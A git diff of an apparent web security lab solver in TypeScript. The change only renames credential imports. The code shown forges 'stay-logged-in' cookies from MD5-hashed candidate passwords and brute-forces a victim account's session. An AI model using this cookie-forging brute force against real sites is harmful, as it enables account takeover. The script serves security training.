@@ -1,8 +1,8 @@
 import md5 from "md5";
 import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
 import { runTasks } from "../../../utils/runTasks.js";
-import { getPasswords } from "../../../../config/config.js";
-import { victimsAccount } from "../../../../config/accounts.js";
+import { victimsCredentials } from "../../../config/credentials.js";
+import { getPasswords } from "../../../config/getPasswords.js";
 
 const { labUrl, concurrencyLimit, httpClient } = getParsedInputFromUser({
   description: "Lab: Brute-forcing a stay-logged-in cookie",
@@ -24,7 +24,7 @@ async function task(password: string) {
   if (isLoggedIn(resp.data)) {
     console.log(`${password}: success`);
     console.log(
-      `Login with username "${victimsAccount.username}" and password "${password}" to solve the lab`,
+      `Login with username "${victimsCredentials.username}" and password "${password}" to solve the lab`,
     );
     process.exit(0);
   } else {
@@ -34,12 +34,12 @@ async function task(password: string) {
 
 function getCookie(password: string) {
   const hash = md5(password);
-  const value = Buffer.from(`${victimsAccount.username}:${hash}`).toString(
+  const value = Buffer.from(`${victimsCredentials.username}:${hash}`).toString(
     "base64",
   );
   return "stay-logged-in=" + value;
 }
 
 function isLoggedIn(html: string) {
-  return html.includes(`my-account?id=${victimsAccount.username}`);
+  return html.includes(`my-account?id=${victimsCredentials.username}`);
 }
